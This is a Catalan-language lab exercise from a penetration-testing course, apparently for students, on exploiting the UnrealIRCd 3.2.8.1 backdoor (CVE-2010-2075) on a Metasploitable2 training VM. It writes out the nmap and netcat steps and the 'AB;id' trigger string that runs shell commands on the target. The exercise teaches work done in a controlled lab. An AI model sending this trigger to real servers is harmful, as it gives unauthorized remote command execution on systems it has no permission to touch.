---
id: EX-08-19
title: "UnrealIRCd backdoor al Metasploitable"
status: draft
version: 1.0
created: 2026-08-07
updated: 2026-08-07
authors:
  - Bernat Mora
  - Hermes Agent
tags:
  - irc
  - unrealircd
  - backdoor
  - metasploitable2
  - nivell-avansat
prerequisites:
  - LAB-15-10
related:
  - LAB-15-10
  - LAB-15-11
estimated_time: 30 min
difficulty: beginner
---

# EX-08-19 - UnrealIRCd backdoor al Metasploitable

> Entrar al IRC del Metasploitable2 amb la porta del darrere de UnrealIRCd.

## Que has de fer

1. Des del Kali, obre una terminal
2. Comprova el servei: `nmap -sV -p 6667 10.10.30.30`
3. Connecta al IRC: `nc -nv 10.10.30.30 6667`
4. Si veus `UnrealIRCd`, envia: `AB;id`
5. Si funciona, veuras la sortida de la comanda `id`
6. Prova altres comandes: `whoami`, `ls /`
7. Desconecta amb Ctrl+C

## Que has de buscar

- Quin servidor IRC hi ha? Versio?
- Es la versio vulnerable? (3.2.8.1)
- Quin CVE te?
- Quines comandes pots executar?
- Com podem protegir l'IRC?

## Preguntes per respondre

1. Has aconseguit executar comandes?
2. Quin CVE te UnrealIRCd 3.2.8.1?
3. Com podem protegir el IRC?

## Glossari

- **IRC**: Internet Relay Chat. Protocol de xat antic.
- **UnrealIRCd**: Servidor IRC molt utilitzat. Versio 3.2.8.1 te backdoor.
- **CVE-2010-2075**: Backdoor a UnrealIRCd 3.2.8.1.
- **backdoor**: Codi amagat per accedir sense permis.

## Validacio

Quan acabis, compara els teus resultats amb els del document [LAB-15-11](../labs/lab-15-11-nmap-complet-metaploitable2.md).

## Seguretat

**Recorda**: 
- Aquestes tecniques nomes sha d'utilitzar en entorns controlats (com aquest lab)
- Mai en sistemes reals sense permis
- Practicar sense permis es IL·LEGAL

## Referencies

- [LAB-15-10](../labs/lab-15-10-lab-real-muntat.md) - Lab real muntat al Kali
- [LAB-15-11](../labs/lab-15-11-nmap-complet-metaploitable2.md) - Nmap complet
- [EX-08-01](ex-08-01-nmap-metasploitable.md) - Nmap Metasploitable
- [EX-08-02](ex-08-02-sql-injection-dvwa.md) - SQL Injection DVWA
